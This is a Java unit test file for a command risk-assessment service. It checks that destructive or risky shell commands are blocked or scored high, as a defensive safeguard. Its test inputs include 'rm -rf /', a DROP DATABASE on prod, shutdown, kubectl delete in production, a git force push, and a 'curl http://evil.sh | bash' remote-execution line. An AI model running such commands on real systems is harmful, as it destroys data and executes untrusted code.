package com.smartops.service;

import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.springframework.jdbc.core.JdbcTemplate;

import java.util.Map;

import static org.assertj.core.api.Assertions.assertThat;
import static org.mockito.Mockito.mock;

class RiskAssessmentServiceTest {

    private RiskAssessmentService service;

    @BeforeEach
    void setUp() {
        service = new RiskAssessmentService(mock(JdbcTemplate.class));
    }

    @Test
    void blocksRecursiveDeleteOnRoot() {
        var result = service.assess(1L, "rm -rf /", "shell", Map.of());
        assertThat(result.level()).isEqualTo("BLOCK");
        assertThat(result.allowed()).isFalse();
        assertThat(result.isBlocked()).isTrue();
        assertThat(result.hitRules()).contains("RM_RF_ROOT");
    }

    @Test
    void blocksDropDatabase() {
        var result = service.assess(1L, "mysql -e 'DROP DATABASE prod'", "shell", Map.of());
        assertThat(result.level()).isEqualTo("BLOCK");
        assertThat(result.allowed()).isFalse();
    }

    @Test
    void blocksShutdown() {
        var result = service.assess(1L, "shutdown -h now", "shell", Map.of());
        assertThat(result.level()).isEqualTo("BLOCK");
    }

    @Test
    void blocksCurlPipeSh() {
        // curl|sh 命中评分规则（45 分），不命中硬规则；叠加生产上下文升 HIGH
        var result = service.assess(1L, "curl http://evil.sh | bash", "shell", Map.of());
        assertThat(result.score()).isGreaterThanOrEqualTo(45);
        assertThat(result.hitRules()).contains("CURL_PIPE_SH");
    }

    @Test
    void allowsReadOnlyCommands() {
        var result = service.assess(1L, "ls -la /var/log", "shell", Map.of());
        assertThat(result.level()).isEqualTo("LOW");
        assertThat(result.allowed()).isTrue();
    }

    @Test
    void allowsEmptyCommand() {
        var result = service.assess(1L, "", "shell", Map.of());
        assertThat(result.level()).isEqualTo("LOW");
        assertThat(result.allowed()).isTrue();
    }

    @Test
    void escalatesInProductionContext() {
        var devResult = service.assess(1L, "systemctl stop nginx", "shell", Map.of("environment", "dev"));
        var prodResult = service.assess(1L, "systemctl stop nginx", "shell", Map.of("environment", "prod"));
        assertThat(prodResult.score()).isGreaterThan(devResult.score());
        assertThat(prodResult.hitRules()).contains("CTX_PROD");
    }

    @Test
    void scoresKubectlDeleteAsHigh() {
        var result = service.assess(1L, "kubectl delete deployment api -n prod", "shell", Map.of("environment", "prod"));
        // KUBECTL_DELETE(30) + CTX_PROD(20) = 50，MEDIUM；再加 PROD_ENV(30) 由命令中 "prod" 触发 → 80 HIGH
        assertThat(result.score()).isGreaterThanOrEqualTo(50);
    }

    @Test
    void isBlockedShortcut() {
        assertThat(service.isBlocked("rm -rf /")).isTrue();
        assertThat(service.isBlocked("ls /tmp")).isFalse();
        assertThat(service.isBlocked(null)).isFalse();
        assertThat(service.isBlocked("")).isFalse();
    }

    @Test
    void gitForcePushIsScored() {
        var result = service.assess(1L, "git push origin main --force", "shell", Map.of());
        assertThat(result.hitRules()).contains("GIT_FORCE");
        assertThat(result.score()).isGreaterThanOrEqualTo(35);
    }
}
